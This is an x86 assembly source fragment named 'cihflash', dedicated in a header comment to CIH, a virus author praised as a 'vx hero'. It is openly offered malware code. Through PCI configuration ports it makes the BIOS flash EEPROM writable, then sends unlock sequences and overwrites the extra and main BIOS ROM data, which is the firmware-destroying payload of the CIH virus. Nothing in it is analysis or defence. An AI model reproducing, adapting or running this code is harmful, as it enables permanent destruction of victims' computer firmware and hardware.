
; --------------------------------------------------------------------------
;   personal greetz to CIH, vx hero, who fucked all the world
; --------------------------------------------------------------------------

cihflash:               pusha

                        mov     bp, 0cf8h

; * Show BIOS Page in 000E0000 - 000EFFFF    (   64 KB   )

                        mov     edi, 8000384ch
                        mov     dx, 0cfeh
                        cli
                        call    IOForEEPROM

; * Show BIOS Page in 000F0000 - 000FFFFF   (   64 KB   )

                        mov     di, 0058h
                        dec     edx
                        mov     word ptr BooleanCalculateCode, 0f24h ; ==and al,0fh
                        call    IOForEEPROM

; * Show the BIOS Extra ROM Data in Memory  000E0000 - 000E01FF
; *   (   512 Bytes   ), and the Section  of Extra BIOS can be Writted...

                        mov     eax, 0e5555h
                        mov     ecx, 0e2aaah
                        call    EnableEEPROMToWrite
                        mov     byte ptr [eax], 60h
                        push    ecx
                        loop    $

; * Kill the BIOS Extra ROM Data in Memory  000E0000 - 000E007F
; *   (   80h Bytes   )

                        xor     ah, ah
                        mov     [eax], al
                        xchg    ecx, eax
                        loop    $

; * Show and Enable the BIOS Main ROM Data  000E0000 - 000FFFFF
; *   (   128 KB   )   can be Writted...

                        mov     eax, 0f5555h
                        pop     ecx
                        mov     ch, 0aah
                        call    EnableEEPROMToWrite
                        mov     byte ptr [eax], 20h
                        loop    $

; * Kill the BIOS Main ROM Data in Memory  000FE000 - 000FE07F
; *   (   80h Bytes   )

                        mov     ah, 0e0h
                        mov     [eax], al

; * Hide BIOS Page in  000F0000 - 000FFFFF
; *    (   64 KB   )

                        mov     word ptr BooleanCalculateCode, 100ch ; ==or al,10h
                        call    IOForEEPROM

                        popa
                        retn

; ***************************
; * Enable EEPROM to Write  *
; ***************************

EnableEEPROMToWrite:
                        mov     [eax], cl
                        mov     [ecx], al
                        mov     byte ptr [eax], 80h
                        mov     [eax], cl
                        mov     [ecx], al
                        retn

; ***************************
; * IO for EEPROM           *
; ***************************

IOForEEPROM:
                        xchg    eax, edi
                        xchg    edx, ebp
                        out     dx, eax
                        xchg    eax, edi
                        xchg    edx, ebp
                        in      al, dx

BooleanCalculateCode    =       $
                        or      al, 44h

                        xchg    eax, edi
                        xchg    edx, ebp
                        out     dx, eax
                        xchg    eax, edi
                        xchg    edx, ebp
                        out     dx, al

                        retn
